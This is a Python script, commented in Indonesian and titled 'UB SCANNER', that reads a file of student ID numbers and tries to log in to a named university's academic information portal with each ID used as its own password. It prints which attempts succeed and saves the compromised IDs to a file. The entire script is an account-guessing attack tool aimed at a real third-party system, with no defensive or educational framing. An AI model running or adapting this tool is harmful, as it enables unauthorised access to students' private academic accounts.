import os
os.system('clear')

try:
	import requests as req
	import requests.packages.urllib3
	from bs4 import BeautifulSoup as Bs
	from multiprocessing.pool import ThreadPool
	requests.packages.urllib3.disable_warnings()
except ModuleNotFoundError:
	os.system('python -m pip install --upgrade pip')
	os.system('pip install requests bs4')
	exit('\nSilahkan jalankan ulang Script nya.')

def start(file):
	try:
		# Membuka filepath
		with open(file, 'r') as file:
			hitung  = 0
			failed  = []
			success = []
			barisan = file.readlines()
			for baris in barisan:
				hitung +=1
				
				# Melakukan login dan menampikan output
				ses = req.Session()

				xhost = 'https://siam.ub.ac.id'
				xdata = { 'nim': baris.strip(), 'kata sandi': baris.strip(),'submit':'Masuk'}
				hasil = ses.post(xhost, data=xdata).text
				cek = Bs(hasil, 'html.parser').find('title')
				
				# Menentukan berhasil atau gagal
				if cek.text == 'Sistem Informasi Akademik Mahasiswa':
					print(f'\033[37m{hitung}) \033[92m{baris.strip()} | {baris.strip()} 》 [SUKSES]')
					success.append(f'{baris.strip()}')
					break
				else:
					print(f'\033[37m{hitung}) \033[31m{baris.strip()} | {baris.strip()} 》 [GAGAL]')
					failed.append(f'{baris.strip()}')
			
			# Menghitung data akun yg berhasil login
			totalsukses = 0
			for i in success:
				totalsukses +=1
			print(f'\n\033[37m => Sukses: \033[92m{totalsukses}')
			
			# Menghitung data akun yg gagal saat login
			totalgagal = 0
			for i in failed:
				totalgagal +=1
			print(f'\033[37m => Gagal: \033[91m{totalgagal}\033[37m\n')
			
			# Menampilkan data akun yg berhasil login
			hitung = 0
			print('Nim Sukses Login:')
			for i in success:
				hitung += 1
				print(f'\033[37m {hitung}) NIM: \033[92m{i} \033[37m| PASSWORD: \033[92m{i}')
				
				# Menyimpan data sukses ke sebuah file
				with open(f'hasil.txt', 'a') as hasil:
					hasil.write(f'{i}\n')
					hasil.close()
			exit("\033[37m\nData tersimpan di \033[96m'hasil.txt'")
		
	except FileNotFoundError:
		exit('\033[91mMaaf, file tidak ditemukan :(')
 

def main():
	print("\033[5;31;40m------------------------------\n\033[5;33;40m==============================\n\033[5;32;40mU B  S C A N N E R | Z U A R\n\033[5;33;40m==============================\n\033[5;31;40m------------------------------")
	file = input('\033[5;36;40m\nMasukan File Nim 》 ')
	start(file)

if __name__ == '__main__':
	main()